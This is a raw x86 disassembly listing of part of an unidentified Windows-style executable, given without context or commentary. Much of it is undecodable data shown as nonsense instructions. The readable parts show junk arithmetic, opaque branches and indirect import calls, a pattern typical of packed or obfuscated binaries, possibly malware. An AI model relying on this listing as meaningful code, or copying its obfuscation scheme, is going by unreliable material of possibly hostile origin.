  401844:	and    al,0xda
  401846:	lock fwait
  401848:	js     0x4018a0
  40184a:	sar    BYTE PTR [bx+di-0x2c],0xdc
  40184f:	test   edi,ecx
  401851:	in     al,0x24
  401853:	adc    DWORD PTR [bp+si+0x35],eax
  401857:	aad    0xd7
  401859:	or     al,0x9b
  40185b:	loope  0x4018c8
  40185d:	outs   dx,BYTE PTR ds:[esi]
  40185e:	mov    esi,0x1b913e96
  401863:	inc    edx
  401864:	pop    esp
  401865:	sti    
  401866:	adc    BYTE PTR [ecx+ecx*2+0x77],0x8f
  40186b:	stc    
  40186c:	lods   al,BYTE PTR ds:[esi]
  40186d:	sar    BYTE PTR [edx-0x240caf45],cl
  401873:	fucomp st(0)
  401875:	pop    edx
  401876:	push   eax
  401877:	jno    0x401847
  401879:	add    al,0x19
  40187b:	lea    ebp,[edi-0x47]
  40187e:	ret    0xb630
  401881:	aas    
  401882:	(bad)  [ecx+0x551a5ccd]
  401888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401889:	or     BYTE PTR [edx-0x5b6c3b3f],cl
  40188f:	adc    BYTE PTR ds:0x748c0428,ah
  401895:	dec    eax
  401896:	lock lock clc 
  401899:	xor    eax,0x974d7770
  40189e:	jne    0x401866
  4018a0:	adc    DWORD PTR [eax+0x2e6392fc],ecx
  4018a6:	loopne 0x4018a4
  4018a8:	jae    0x401893
  4018aa:	push   ebx
  4018ab:	dec    esp
  4018ac:	retf   
  4018ad:	pop    eax
  4018ae:	add    ecx,DWORD PTR [edi-0x53]
  4018b1:	cmp    al,0x59
  4018b3:	adc    edi,edx
  4018b5:	or     edi,DWORD PTR [edi+0x2]
  4018b8:	ror    BYTE PTR [edi-0x33],cl
  4018bb:	dec    edi
  4018bc:	(bad)  
  4018bd:	loop   0x401927
  4018bf:	nop
  4018c0:	sbb    esi,DWORD PTR [esp+ebp*1+0x6b0ffd7b]
  4018c7:	jnp    0x40187a
  4018c9:	and    cl,BYTE PTR [esi+0x40]
  4018cc:	sbb    dh,bh
  4018ce:	jns    0x4018ed
  4018d0:	jne    0x401906
  4018d2:	in     al,dx
  4018d3:	in     eax,0x6d
  4018d5:	inc    esp
  4018d6:	pop    es
  4018d7:	in     eax,0xd
  4018d9:	(bad)  
  4018db:	arpl   WORD PTR [edx+edi*2+0x47],si
  4018df:	sbb    al,0x9a
  4018e1:	inc    ecx
  4018e2:	sbb    DWORD PTR [ecx+ebx*4],0x63
  4018e6:	xor    al,0x6e
  4018e8:	sub    cl,BYTE PTR [ebx+edi*1-0x1d]
  4018ec:	gs xor eax,0x80e674e9
  4018f2:	mov    ds,ecx
  4018f4:	pop    ecx
  4018f5:	mov    ds:0x490a4ee3,eax
  4018fa:	call   0xdeaf:0xf278c307
  401901:	push   esi
  401902:	jecxz  0x401976
  401904:	adc    al,ah
  401906:	and    eax,0x1d254d31
  40190b:	xchg   DWORD PTR [ebx+0x4f],esi
  40190e:	fs add eax,0xd245ac4b
  401914:	data16 mov dl,0x4e
  401917:	xchg   esi,eax
  401918:	add    edx,0x14
  40191b:	sub    al,0x74
  40191d:	or     bh,BYTE PTR [ecx+0x628bb42a]
  401923:	stos   BYTE PTR es:[edi],al
  401924:	lods   eax,DWORD PTR ds:[esi]
  401925:	icebp  
  401926:	fidiv  DWORD PTR [esp+esi*8-0x79baf596]
  40192d:	(bad)  
  40192f:	cmp    BYTE PTR [edx-0x3dd4b9ae],dl
  401935:	mov    edx,0x31ab
  40193a:	mov    DWORD PTR [ebp-0x58],eax
  40193d:	sbb    ecx,edi
  40193f:	cmp    DWORD PTR ds:0x428257,0x0
  401946:	not    DWORD PTR ds:0x4282cf
  40194c:	mov    edi,DWORD PTR ds:0x428173
  401952:	mov    DWORD PTR ds:0x42826f,edi
  401958:	jmp    0x4019ab
  40195d:	mov    DWORD PTR ds:0x4282db,0x77e1
  401967:	not    edi
  401969:	cmp    DWORD PTR ds:0x428257,0x0
  401970:	jge    0x401993
  401976:	push   0x637b
  40197b:	call   DWORD PTR ds:0x428d5c
  401981:	mov    edx,DWORD PTR ds:0x428377
  401987:	adc    DWORD PTR ds:0x4282df,edx
  40198d:	and    edx,DWORD PTR ds:0x42822f
  401993:	add    DWORD PTR ds:0x42825f,edx
  401999:	mov    edi,DWORD PTR ds:0x428153
  40199f:	xor    DWORD PTR ds:0x42817b,edi
  4019a5:	and    DWORD PTR ds:0x42814b,ecx
  4019ab:	mov    DWORD PTR [ebp-0x54],ecx
  4019ae:	mov    ecx,DWORD PTR ds:0x42835b
  4019b4:	sub    ecx,DWORD PTR ds:0x42825b
  4019ba:	mov    DWORD PTR ds:0x42835b,ecx
  4019c0:	or     DWORD PTR [ebp-0x58],0xca78b059
  4019c7:	sbb    DWORD PTR ds:0x42836b,edx
  4019cd:	or     DWORD PTR [ebp-0x54],0x9c1b89e8
  4019d4:	adc    edx,edx
  4019d6:	lea    eax,[ebp+0x20]
  4019d9:	mov    DWORD PTR [ebp-0xc],eax
  4019dc:	mov    DWORD PTR ds:0x428363,0x339b
  4019e6:	mov    eax,ds:0x4223b0
  4019eb:	cmp    DWORD PTR ds:0x428247,0x0
  4019f2:	mov    edx,0x5699
  4019f7:	movzx  edx,BYTE PTR ds:0x428257
  4019fe:	mov    edi,0xa42
  401a03:	jmp    0x401a5a
  401a08:	not    edi
  401a0a:	mov    edi,0x2eea
  401a0f:	cmp    DWORD PTR ds:0x428247,0x0
  401a16:	jg     0x401a44
  401a1c:	push   0x3b91
  401a21:	push   0x428267
  401a26:	push   DWORD PTR [ebp-0x1c]
  401a29:	push   0x478c
  401a2e:	call   DWORD PTR ds:0x428e48
  401a34:	adc    ecx,ecx
  401a36:	sbb    ecx,DWORD PTR ds:0x428167
  401a3c:	neg    edx
  401a3e:	adc    ecx,DWORD PTR ds:0x428157
  401a44:	sub    DWORD PTR ds:0x4282e3,ecx
  401a4a:	add    DWORD PTR ds:0x428163,0x42825b
  401a54:	xor    edx,DWORD PTR ds:0x4282cb
  401a5a:	mov    ecx,DWORD PTR [ebp-0xc]
  401a5d:	mov    eax,DWORD PTR [eax]
  401a5f:	add    eax,DWORD PTR [ecx]
  401a61:	sub    DWORD PTR ds:0x428173,edi
  401a67:	mov    edi,0x329e695d
  401a6c:	mov    DWORD PTR [ebp-0x14],eax
  401a6f:	inc    edx
  401a70:	mov    eax,DWORD PTR [ebp+0x18]
  401a73:	cmp    DWORD PTR ds:0x428173,0x0
  401a7a:	mov    edx,DWORD PTR ds:0x428247
  401a80:	mov    edx,0x3ce6
  401a85:	mov    DWORD PTR ds:0x4282ff,0xa37
  401a8f:	jmp    0x401ae6
  401a94:	mov    DWORD PTR ds:0x42824b,0x206f
  401a9e:	cmp    DWORD PTR ds:0x428173,0x0
  401aa5:	jg     0x401ac8
  401aab:	push   0x47a2
  401ab0:	push   0x8c73
  401ab5:	push   0x8ece
  401aba:	call   DWORD PTR ds:0x428d60
  401ac0:	sub    edx,DWORD PTR ds:0x428383
  401ac6:	or     edx,ecx
  401ac8:	sub    ecx,0x6960
  401ace:	mov    ecx,DWORD PTR ds:0x42836f
  401ad4:	adc    ecx,DWORD PTR ds:0x42815f
  401ada:	mov    DWORD PTR ds:0x42836f,ecx
  401ae0:	xor    edx,DWORD PTR ds:0x42815b
  401ae6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401ae9:	shrd   eax,ecx,0x2
  401aed:	cmp    DWORD PTR ds:0x428143,0x0
  401af4:	mov    edx,0x4200
  401af9:	mov    DWORD PTR ds:0x428257,0x6ba0
  401b03:	mov    DWORD PTR ds:0x42816f,0x1855
  401b0d:	jmp    0x401b6b
  401b12:	mov    DWORD PTR ds:0x42814f,0x2fa6
  401b1c:	cmp    DWORD PTR ds:0x428143,0x0
  401b23:	jge    0x401b53
  401b29:	push   DWORD PTR [ebp-0x28]
  401b2c:	push   DWORD PTR [ebp-0x20]
  401b2f:	push   0x672f
  401b34:	call   DWORD PTR ds:0x428eb0
  401b3a:	movzx  edx,WORD PTR ds:0x42827f
  401b41:	and    edx,DWORD PTR ds:0x42815b
  401b47:	mov    DWORD PTR ds:0x42827f,edx
  401b4d:	and    DWORD PTR ds:0x428237,edx
  401b53:	add    DWORD PTR ds:0x42837b,edx
  401b59:	sub    edx,DWORD PTR ds:0x428283
  401b5f:	add    DWORD PTR ds:0x42823b,edi
  401b65:	or     edx,DWORD PTR ds:0x428367
  401b6b:	shr    ecx,0x2
  401b6e:	mov    ecx,DWORD PTR [ebp+0x18]
  401b71:	cmp    DWORD PTR ds:0x4282eb,0x0
  401b78:	mov    DWORD PTR ds:0x428283,0x3b05
  401b82:	mov    edx,0x7243
  401b87:	mov    DWORD PTR ds:0x428153,0x6e0d
  401b91:	jmp    0x401bec
  401b96:	mov    edx,0x2e5f
  401b9b:	mov    edx,DWORD PTR ds:0x428227
  401ba1:	cmp    DWORD PTR ds:0x4282eb,0x0
  401ba8:	je     0x401be0
  401bae:	push   DWORD PTR [ebp-0x18]
  401bb1:	push   DWORD PTR [ebp-0x20]
  401bb4:	push   DWORD PTR [ebp-0x10]
  401bb7:	push   0x15fe
  401bbc:	push   0x400000
  401bc1:	call   DWORD PTR ds:0x428d74
  401bc7:	sub    DWORD PTR ds:0x4282d7,ecx
  401bcd:	movzx  edx,WORD PTR ds:0x42823b
  401bd4:	add    DWORD PTR ds:0x4282e7,edx
  401bda:	add    DWORD PTR ds:0x42813f,ebx
  401be0:	sbb    DWORD PTR ds:0x42820f,edi
  401be6:	inc    DWORD PTR ds:0x42820f
  401bec:	mov    edx,DWORD PTR [ebp+0x1c]
  401bef:	xor    eax,edi
  401bf1:	xor    edx,edx
  401bf3:	or     DWORD PTR ds:0x428373,0x428217
  401bfd:	or     edx,eax
  401bff:	jmp    0x401fdd
  401c04:	xchg   ebp,eax
  401c05:	xchg   ecx,eax
  401c06:	je     0x401c58
  401c08:	ins    BYTE PTR es:[edi],dx
  401c09:	sub    al,0x2d
  401c0b:	dec    esp
  401c0c:	and    eax,0xcbb0afeb
  401c11:	loope  0x401bf2
  401c13:	jle    0x401c3a
  401c15:	or     bl,BYTE PTR [eax]
  401c17:	sbb    BYTE PTR [esi-0x48e7e7ee],bl
  401c1d:	cmp    al,0x35
  401c1f:	stc    
  401c20:	fcmovnbe st,st(7)
  401c22:	dec    edx
  401c23:	mov    BYTE PTR [ebp-0x4e3bcf36],bh
  401c29:	xor    BYTE PTR [eax-0x32],0xd2
  401c2d:	stos   DWORD PTR es:[edi],eax
  401c2e:	in     al,0xde
  401c30:	mov    eax,ds:0x972e5e12
  401c35:	pop    ebp
  401c36:	push   edx
  401c37:	retf   
  401c38:	inc    ebx
  401c39:	std    
  401c3a:	adc    ebp,DWORD PTR [ebp+0x455b13da]
  401c40:	or     DWORD PTR [eax+0x978be03],esi
  401c46:	shl    ebp,cl
  401c48:	or     eax,0xfa72d1b6
  401c4d:	inc    edx
  401c4e:	out    dx,al
  401c4f:	int3   
  401c50:	dec    esi
  401c51:	scas   eax,DWORD PTR es:[edi]
  401c52:	outs   dx,BYTE PTR ds:[esi]
  401c53:	outs   dx,DWORD PTR ds:[esi]
  401c54:	loope  0x401c21
  401c56:	mov    esp,0xa59e6dca
  401c5b:	pop    ebp
  401c5c:	fwait
  401c5d:	cmp    eax,0x5de73b23
  401c62:	das    
  401c63:	ret    
  401c64:	push   eax
  401c65:	mov    esi,DWORD PTR [esi+ebp*1-0x73c579b9]
  401c6c:	cmp    DWORD PTR [edx+0x5af6e4a5],0x4ae0ccbc
  401c76:	pop    eax
  401c77:	and    al,0xcd
  401c79:	jno    0x401c19
  401c7b:	popa   
  401c7c:	fwait
  401c7d:	(bad)  
  401c7e:	pop    edx
  401c7f:	in     eax,dx
  401c80:	std    
  401c81:	sub    ebp,ecx
  401c83:	mov    eax,0x302636bb
  401c88:	les    edx,FWORD PTR ds:0x24d38bfd
  401c8e:	ds je  0x401c57
  401c91:	jmp    0x1ebe:0x262e6be1
  401c98:	js     0x401cf2
  401c9a:	mov    al,0xca
  401c9c:	sti    
  401c9d:	fsubr  DWORD PTR [ecx]
  401c9f:	push   edi
  401ca0:	outs   dx,DWORD PTR ds:[esi]
  401ca1:	mov    ch,0x8b
  401ca3:	fsubr  QWORD PTR [ebx+0x0]
  401ca6:	bound  ecx,QWORD PTR [eax+eax*4]
  401ca9:	retf   0xd014
  401cac:	mov    bl,0x2e
  401cae:	inc    ebp
  401caf:	mov    ds:0xa80d996e,al
  401cb4:	adc    al,0x44
  401cb6:	xchg   edi,eax
  401cb7:	pop    ebp
  401cb8:	inc    edx
  401cb9:	add    ebp,DWORD PTR [edi-0xa]
  401cbc:	jbe    0x401c4f
  401cbe:	mov    ecx,0x472f3a59
  401cc3:	xor    esp,edi
  401cc5:	or     DWORD PTR [ebx],ecx
  401cc7:	jl     0x401cf6
  401cc9:	test   BYTE PTR [ebx+0x77],dh
  401ccc:	push   cs
  401ccd:	jb     0x401d3e
  401ccf:	xchg   edi,eax
  401cd0:	push   eax
  401cd1:	repz jmp 0xb62ca32e
  401cd7:	xchg   ecx,esi
  401cd9:	xlat   BYTE PTR ds:[ebx]
  401cda:	loopne 0x401cf2
  401cdc:	aad    0x0
  401cde:	clc    
  401cdf:	push   ss
  401ce0:	push   ebp
  401ce1:	cmp    BYTE PTR [eax+0x37],dh
  401ce4:	retf   
  401ce5:	mov    BYTE PTR [eax],ch
  401ce7:	popf   
  401ce8:	(bad)  
  401ce9:	repnz sub al,0xa3
  401cec:	loop   0x401d0b
  401cee:	mov    ch,0xd2
  401cf0:	retf   
  401cf1:	outs   dx,BYTE PTR ds:[esi]
  401cf2:	mov    ah,0xbe
  401cf4:	push   esp
  401cf5:	push   ebx
  401cf6:	ret    0x5af0
  401cf9:	(bad)  
  401cfa:	shr    BYTE PTR [ebx+0x4f],cl
  401cfd:	add    edx,ecx
  401cff:	ret    0x3cd8
  401d02:	int    0x31
  401d04:	add    al,0x9
  401d06:	and    eax,0x5e6b9aa7
  401d0b:	adc    BYTE PTR [ecx+edx*4-0x7085e68b],bh
  401d12:	mov    ebx,0xe2090760
  401d17:	xchg   edx,eax
  401d18:	push   ss
  401d19:	jle    0x401cf1
  401d1b:	popf   
  401d1c:	and    BYTE PTR [esi-0x51],dh
  401d1f:	pop    es
  401d20:	retf   
  401d21:	lds    esp,FWORD PTR [ebp+0x7a]
  401d24:	imul   eax,DWORD PTR ds:0x2044d574,0x48
  401d2b:	adc    edi,DWORD PTR [edi+0x5d2a0658]
  401d31:	mov    bh,0x7d
  401d33:	hlt    
  401d34:	int3   
  401d35:	sub    DWORD PTR [ebp-0x16707b1],edi
  401d3b:	jl     0x401cc4
  401d3d:	ja     0x401d6d
  401d3f:	dec    eax
  401d40:	jle    0x401d9d
  401d42:	pushf  
  401d43:	mov    bh,0xcc
  401d45:	rcr    BYTE PTR [edi],0x69
  401d48:	out    0x1a,al
  401d4a:	cmc    
  401d4b:	adc    DWORD PTR [edx+0x32f9100e],esp
  401d51:	(bad)  
  401d52:	pop    ecx
  401d53:	mov    ds:0x1fa52c,al
  401d58:	in     eax,0xc5
  401d5a:	sub    bl,dh
  401d5c:	xor    cl,BYTE PTR [edi-0x6a]
  401d5f:	push   edx
  401d60:	popa   
  401d61:	add    BYTE PTR [esi+0x57],0x4d
  401d65:	int    0xde
  401d67:	mov    esp,0x1e1a0e00
  401d6c:	pop    esp
  401d6d:	lock aas 
  401d6f:	jmp    0xd093a5f9
  401d74:	sub    ecx,DWORD PTR [ebx-0x15f8f48a]
  401d7a:	or     eax,0xf13189a3
  401d7f:	add    eax,0x419c65b9
  401d84:	enter  0x443,0xc8
  401d88:	or     BYTE PTR [esi],ah
  401d8a:	sub    BYTE PTR gs:[edx],0xf4
  401d8e:	pop    es
  401d8f:	pop    edi
  401d90:	xchg   edx,eax
  401d91:	das    
  401d92:	lahf   
  401d93:	fs inc esi
  401d95:	pop    esi
  401d96:	pop    edi
  401d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d98:	ss push ebp
  401d9a:	mov    dh,0x97
  401d9c:	xor    dh,bl
  401d9e:	add    eax,0x52ea7b27
  401da3:	pop    edx
  401da4:	dec    eax
  401da5:	nop
  401da6:	xchg   esi,eax
  401da7:	or     eax,ebx
  401da9:	xor    ebp,DWORD PTR [edx+0x31]
  401dac:	loope  0x401da3
  401dae:	push   edx
  401daf:	sbb    eax,0x2ccb4a7d
  401db4:	pop    esp
  401db5:	mov    ecx,0xda480c16
  401dba:	add    eax,DWORD PTR [esi]
  401dbc:	data16 rcl BYTE PTR [ecx-0x6addbfd1],1
  401dc3:	jns    0x401df0
  401dc5:	nop
  401dc6:	mov    ds:0xab594830,eax
  401dcb:	add    ch,dh
  401dcd:	cmp    ebx,DWORD PTR [eax+0x2e]
  401dd0:	inc    edx
  401dd1:	and    DWORD PTR [ebp-0x71],eax
  401dd4:	aam    0x91
  401dd6:	imul   esi,DWORD PTR [edi+0x3a],0x21a1b635
  401ddd:	data16 inc sp
  401de0:	call   0x4044:0x5098605d
  401de7:	inc    edi
  401de8:	push   esp
  401de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dea:	dec    edx
  401deb:	loop   0x401dc7
  401ded:	lea    esp,[ebp-0x37]
  401df0:	xchg   esp,eax
  401df1:	mov    dl,0x3
  401df3:	pop    ebx
  401df4:	xor    DWORD PTR [ebx-0x51dc293a],0x3ffebf8a
  401dfe:	adc    eax,0xd2cb4fb2
  401e03:	mov    edx,0x4d64d9da
  401e08:	xchg   BYTE PTR [ebx-0x3944555b],dl
  401e0e:	ret    
  401e0f:	mov    ecx,0x7dd14178
  401e14:	jno    0x401e91
  401e16:	adc    ebx,DWORD PTR [ebx+0x512b4faf]
  401e1c:	inc    edi
  401e1d:	or     ch,bl
  401e1f:	(bad)  
  401e20:	out    dx,eax
  401e21:	je     0x401da6
  401e23:	jl     0x401dfe
  401e25:	sbb    BYTE PTR [edi+0x53ad8422],0x53
  401e2c:	dec    ecx
  401e2d:	mov    ds:0x9a3e44d3,al
  401e32:	repnz mov ecx,0xc2ce3b42
  401e38:	pop    esp
  401e39:	outs   dx,DWORD PTR ds:[esi]
  401e3a:	out    0xca,eax
  401e3c:	mov    ds,ebx
  401e3e:	or     BYTE PTR [edi-0x21],dl
  401e41:	jb     0x401dfd
  401e43:	sub    ch,BYTE PTR [edi+0xf]
  401e46:	clc    
  401e47:	mov    edi,0x1847f667
  401e4c:	jp     0x401e9c
  401e4e:	adc    BYTE PTR [ecx],ch
  401e50:	sbb    al,0x8f
  401e52:	cwde   
  401e53:	lods   eax,DWORD PTR ds:[esi]
  401e54:	cmp    al,0xd4
  401e56:	stc    
  401e57:	push   esp
  401e58:	enter  0x84f1,0x5b
  401e5c:	add    al,0x1e
  401e5e:	rcl    BYTE PTR [eax+ecx*4],0x3e
  401e62:	rol    DWORD PTR [esp+edx*4+0x11],0xd
  401e67:	out    dx,al
  401e68:	hlt    
  401e69:	idiv   ch
  401e6b:	out    dx,al
  401e6c:	xchg   ebp,eax
  401e6d:	lods   al,BYTE PTR ds:[esi]
  401e6e:	pop    esp
  401e6f:	retf   
  401e70:	aam    0xe4
  401e72:	cwde   
  401e73:	jbe    0x401e8e
  401e75:	or     al,0x95
  401e77:	inc    ecx
  401e78:	js     0x401ec3
  401e7a:	clc    
  401e7b:	adc    bl,BYTE PTR [edx+0x76d630ab]
  401e81:	fcomi  st,st(6)
  401e83:	(bad)  
  401e84:	pop    ds
  401e85:	test   BYTE PTR [edi-0x10],ch
  401e88:	pop    esi
  401e89:	xchg   BYTE PTR [ebx],bh
  401e8b:	loop   0x401e3f
  401e8d:	sbb    al,0xce
  401e8f:	cdq    
  401e90:	pop    ds
  401e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e92:	iret   
  401e93:	dec    esp
  401e94:	pop    es
  401e95:	push   ecx
  401e96:	inc    esi
  401e97:	or     DWORD PTR [ecx-0xa76d551],0x58101db0
  401ea1:	int3   
  401ea2:	jge    0x401f1a
  401ea4:	arpl   WORD PTR [ebx],si
  401ea6:	retf   0x5eb7
  401ea9:	shr    BYTE PTR [esi],1
  401eab:	jmp    0xc74613ae
  401eb0:	stc    
  401eb1:	dec    ebx
  401eb2:	add    ebp,DWORD PTR [edi-0x46]
  401eb5:	mov    esi,0x7ca91068
  401eba:	cmc    
  401ebb:	fwait
  401ebc:	ss dec ecx
  401ebe:	dec    esi
  401ebf:	dec    eax
  401ec0:	std    
  401ec1:	(bad)  
  401ec2:	xor    eax,0xd5652018
  401ec7:	cdq    
  401ec8:	cmp    BYTE PTR [esi+0xa],cl
  401ecb:	scas   eax,DWORD PTR es:[edi]
  401ecc:	push   ebp
  401ecd:	js     0x401e59
  401ecf:	pushf  
  401ed0:	rol    DWORD PTR [ebx-0x72],cl
  401ed3:	js     0x401e6a
  401ed5:	sbb    BYTE PTR [ebp+0x45],0x66
  401ed9:	fcom   QWORD PTR [esi-0x6c]
  401edc:	scas   eax,DWORD PTR es:[edi]
  401edd:	inc    esi
  401ede:	push   ecx
  401edf:	cmp    esi,DWORD PTR [edi+eax*2+0x3d]
  401ee3:	ins    BYTE PTR es:[edi],dx
  401ee4:	cmp    ecx,eax
  401ee6:	mov    WORD PTR [ebp+esi*1-0x736c204],?
  401eed:	sub    ch,BYTE PTR [edi-0x50]
  401ef0:	xchg   edi,eax
  401ef1:	shl    edx,cl
  401ef3:	call   0xef8f:0x50d0c9a
  401efa:	cmp    DWORD PTR [edi+0x5c],edi
  401efd:	mov    bl,0x8
  401eff:	mov    ds:0xfee803be,eax
  401f04:	sbb    eax,0x4283348
  401f09:	inc    ecx
  401f0a:	lods   al,BYTE PTR ds:[esi]
  401f0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f0c:	aaa    
  401f0d:	mov    ds:0xccacb8c4,al
  401f12:	stos   BYTE PTR es:[edi],al
  401f13:	xchg   bl,cl
  401f15:	xor    bl,BYTE PTR [ebx+0x4bc82968]
  401f1b:	jne    0x401f2e
  401f1d:	mov    eax,ds:0x95b1bf28
  401f22:	xchg   ecx,eax
  401f23:	inc    ebx
  401f24:	ins    BYTE PTR es:[edi],dx
  401f25:	mov    esp,0x6d4100b0
  401f2a:	addr16 push edi
  401f2c:	push   ds
  401f2d:	add    al,0xd2
  401f2f:	cmp    eax,0x786dd56d
  401f34:	pusha  
  401f35:	jo     0x401f41
  401f37:	jl     0x401f2c
  401f39:	push   esp
  401f3a:	repz add BYTE PTR [edi],al
  401f3d:	fidivr WORD PTR [eax-0x2b]
  401f40:	or     bl,BYTE PTR [esi]
  401f42:	push   ebx
  401f43:	cmc    
  401f44:	adc    esp,DWORD PTR [edx]
  401f46:	lods   al,BYTE PTR ds:[esi]
  401f47:	pop    esp
  401f48:	sti    
  401f49:	leave  
  401f4a:	in     eax,0x20
  401f4c:	loope  0x401f93
  401f4e:	inc    ecx
  401f4f:	add    ebx,eax
  401f51:	add    DWORD PTR [eax+edi*1],ebp
  401f54:	mov    BYTE PTR [edx],ch
  401f56:	sub    BYTE PTR [edi-0x280eaee3],al
  401f5c:	push   0x374b5443
  401f61:	test   eax,0xedfb613d
  401f66:	loopne 0x401eee
  401f68:	in     al,0xcf
  401f6a:	push   cs
  401f6b:	mov    bl,0x80
  401f6d:	xchg   edx,eax
  401f6e:	out    0x11,eax
  401f70:	fwait
  401f71:	mov    al,0x1b
  401f73:	adc    eax,0x56f51d04
  401f78:	ror    BYTE PTR [ecx-0x4b],1
  401f7b:	in     eax,0x6e
  401f7d:	cwde   
  401f7e:	xor    eax,0x41a23347
  401f83:	jmp    0x9afa7328
  401f88:	pmaxub mm1,mm5
  401f8b:	jns    0x401f9a
  401f8d:	ret    
  401f8e:	repnz or DWORD PTR [ecx],ebx
  401f91:	(bad)  
  401f92:	out    dx,al
  401f93:	std    
  401f94:	(bad)  
  401f95:	js     0x401f9e
  401f97:	mov    ecx,0x1f5235dc
  401f9c:	mov    dl,0xd8
  401f9e:	inc    eax
  401f9f:	xchg   BYTE PTR [edi],dl
  401fa1:	xchg   ebp,eax
  401fa2:	add    eax,0x1f73cc2a
  401fa7:	jp     0x401f30
  401fa9:	xor    ecx,DWORD PTR [ecx+0x47964e73]
  401faf:	jne    0x401fa2
  401fb1:	mov    dh,0xd3
  401fb3:	(bad)  
  401fb4:	fbstp  TBYTE PTR [ebx]
  401fb6:	test   DWORD PTR [eax-0x2],0xc40ad700
  401fbd:	and    al,0x2a
  401fbf:	out    0x13,eax
  401fc1:	out    dx,eax
  401fc2:	jae    0x401fc7
  401fc4:	sbb    eax,0x7854f480
  401fc9:	mov    ebp,0x4b045156
  401fce:	and    ebx,DWORD PTR [ebp+0x12]
  401fd1:	adc    edx,DWORD PTR [ebx]
  401fd3:	sar    BYTE PTR [edi+0x51ee2f33],0xee
  401fda:	stos   DWORD PTR es:[edi],eax
  401fdb:	fdivrp st(6),st
  401fdd:	mov    DWORD PTR [ebp-0x3c],edx
  401fe0:	mov    DWORD PTR [ebp-0x70],0x2c55
  401fe7:	mov    eax,ds:0x42834b
  401fec:	adc    DWORD PTR ds:0x428387,eax
  401ff2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ff9:	cmp    DWORD PTR ds:0x42836b,0x0
  402000:	mov    DWORD PTR ds:0x42826b,0x4df8
  40200a:	mov    DWORD PTR ds:0x428353,0x33aa
  402014:	jmp    0x402076
  402019:	mov    eax,0x569b
  40201e:	mov    eax,0x2370
  402023:	cmp    DWORD PTR ds:0x42836b,0x0
  40202a:	jbe    0x40205c
  402030:	push   DWORD PTR [ebp-0xc]
  402033:	push   0x3ea9
  402038:	call   DWORD PTR ds:0x428d78
  40203e:	or     DWORD PTR ds:0x42814f,0x6f29
  402048:	xor    DWORD PTR ds:0x4282eb,0x4282df
  402052:	add    DWORD PTR ds:0x42826b,0x428307
  40205c:	and    DWORD PTR ds:0x42837b,edi
  402062:	mov    DWORD PTR ds:0x42825b,0x2a04
  40206c:	sub    DWORD PTR ds:0x42817b,0x42813b
  402076:	mov    DWORD PTR [ebp-0x70],0x78a6
  40207d:	cmp    DWORD PTR ds:0x4282cf,0x0
  402084:	mov    DWORD PTR ds:0x4282cb,ecx
  40208a:	mov    DWORD PTR ds:0x428177,0x59f
  402094:	mov    DWORD PTR ds:0x428177,ecx
  40209a:	mov    DWORD PTR ds:0x4282f7,0x5800
  4020a4:	jmp    0x402119
  4020a9:	mov    eax,0x445d
  4020ae:	cmp    DWORD PTR ds:0x4282cf,0x0
  4020b5:	ja     0x4020ec
  4020bb:	push   0x42814b
  4020c0:	push   DWORD PTR [ebp-0x10]
  4020c3:	push   0x842c
  4020c8:	call   DWORD PTR ds:0x428eb4
  4020ce:	sbb    DWORD PTR ds:0x42835b,0x4ff2
  4020d8:	xor    DWORD PTR ds:0x4282db,0x42824f
  4020e2:	adc    DWORD PTR ds:0x42834f,0x4c73
  4020ec:	add    DWORD PTR ds:0x42834f,0x42837f
  4020f6:	and    DWORD PTR ds:0x428137,0x428353
  402100:	sbb    DWORD PTR ds:0x42813b,0x5f9d
  40210a:	sbb    DWORD PTR ds:0x4282cf,0x42827f
  402114:	sbb    eax,0x5252
  402119:	mov    DWORD PTR [ebp-0x6c],0x188
  402120:	neg    eax
  402122:	mov    DWORD PTR [ebp-0x70],0x5b3f
  402129:	mov    DWORD PTR [ebp-0x6c],0x3219
  402130:	mov    DWORD PTR [ebp-0x70],0x231c
  402137:	mov    eax,ds:0x4282cb
  40213c:	add    DWORD PTR ds:0x428267,eax
  402142:	mov    DWORD PTR [ebp-0x6c],0x1337
  402149:	mov    eax,ds:0x42835b
  40214e:	add    DWORD PTR ds:0x4282f7,eax
  402154:	mov    DWORD PTR [ebp-0x70],0x7593
  40215b:	cmp    DWORD PTR ds:0x428147,0x0
  402162:	mov    DWORD PTR ds:0x42836b,0x750f
  40216c:	not    DWORD PTR ds:0x428353
  402172:	jmp    0x4021e4
  402177:	mov    DWORD PTR ds:0x42824b,0x610f
  402181:	mov    eax,ds:0x42815f
  402186:	cmp    DWORD PTR ds:0x428147,0x0
  40218d:	jle    0x4021c5
  402193:	push   0x428049
  402198:	push   DWORD PTR [ebp-0x28]
  40219b:	push   0x1818
  4021a0:	push   DWORD PTR [ebp-0x18]
  4021a3:	push   0x8e39
  4021a8:	push   DWORD PTR [ebp-0x1c]
  4021ab:	call   DWORD PTR ds:0x428e50
  4021b1:	adc    DWORD PTR ds:0x42826f,0x428243
  4021bb:	add    DWORD PTR ds:0x42822f,0x168f
  4021c5:	sub    DWORD PTR ds:0x4282d3,0x428173
  4021cf:	or     DWORD PTR ds:0x428373,0xa53
  4021d9:	mov    eax,ds:0x428227
  4021de:	xor    DWORD PTR ds:0x42813b,eax
  4021e4:	mov    DWORD PTR [ebp-0x6c],0x11b8
  4021eb:	xor    eax,0x39f6
  4021f0:	jmp    0x4025ce
  4021f5:	stos   DWORD PTR es:[edi],eax
  4021f6:	fisttp QWORD PTR [edi+0x32]
  4021f9:	aas    
  4021fa:	and    ch,BYTE PTR [edx-0x2c2c85a4]
  402200:	mov    esp,0xbeec810a
  402205:	stos   DWORD PTR es:[edi],eax
  402206:	add    bl,BYTE PTR [eax]
  402208:	sbb    BYTE PTR [esi-0x47e7e7ee],bl
  40220e:	mov    esp,0x4d4ef85b
  402213:	ins    DWORD PTR es:[edi],dx
  402214:	scas   eax,DWORD PTR es:[edi]
  402215:	jmp    FWORD PTR [edx+0xe]
  402218:	pop    es
  402219:	fs (bad) 
  40221b:	jmp    0x2b9d:0x6944a904
  402222:	cmp    BYTE PTR [ecx-0xd72b992],ah
  402228:	mov    ebp,0x5f7a89a5
  40222d:	sbb    BYTE PTR [eax+0x43],cl
  402230:	fs das 
